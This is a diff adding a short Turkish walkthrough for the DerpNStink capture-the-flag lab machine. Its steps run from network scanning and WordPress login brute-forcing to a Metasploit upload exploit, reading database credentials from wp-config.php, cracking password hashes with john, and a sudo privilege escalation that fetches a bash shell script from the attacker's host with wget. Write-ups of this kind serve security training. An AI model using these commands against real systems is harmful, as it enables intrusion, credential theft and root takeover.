@@ -1,0 +1,27 @@
+DERPNSTİNK MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.140 bulundu.
+2 - nmap -A 192.168.2.140
+3 - view-source:http://192.168.2.140/ -> FLAG 1
+4 - view-source:http://192.168.2.140/webnotes/info.txt
+5 - gobuster dir -u http://192.168.2.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+6 - nano /etc/hosts, 192.168.2.140 derpnstink.local
+7 - wpscan --url http://derpnstink.local/weblog/ -e u, admin
+8 - wpscan --url http://derpnstink.local/weblog/ -e p --usernames admin --passwords /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt, admin : admin
+9 - msfconsole, use exploit/unix/webapp/wp_slideshowgallery_upload
+10 - cd /var/www/html/weblog, cat wp-config.php, root : mysql
+11 - http://192.168.2.140/php/phpmyadmin -> wordpress -> wp_users
+admin : $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ -> admin
+unclestinky : $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 -> wedgie57
+12 - john hash -w=/usr/share/wordlists/rockyou.txt
+13 - su stinky, cd /home/stinky/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/, cat key.txt
+14 - ftp 192.168.2.140, get derpissues.pcap, derp : derpderpderpderpderpderpderp
+15 - su derp, sudo -l
+16 - mkdir binaries
+17 - derpy.sh
+#!/bin/bash
+bash -i
+18 - python -m http.server
+19 - wget http://192.168.2.128:8000/derphy.sh
+20 - chmod 777 derphy.sh
+21 - sudo ./derphy.sh
+22 - whoami
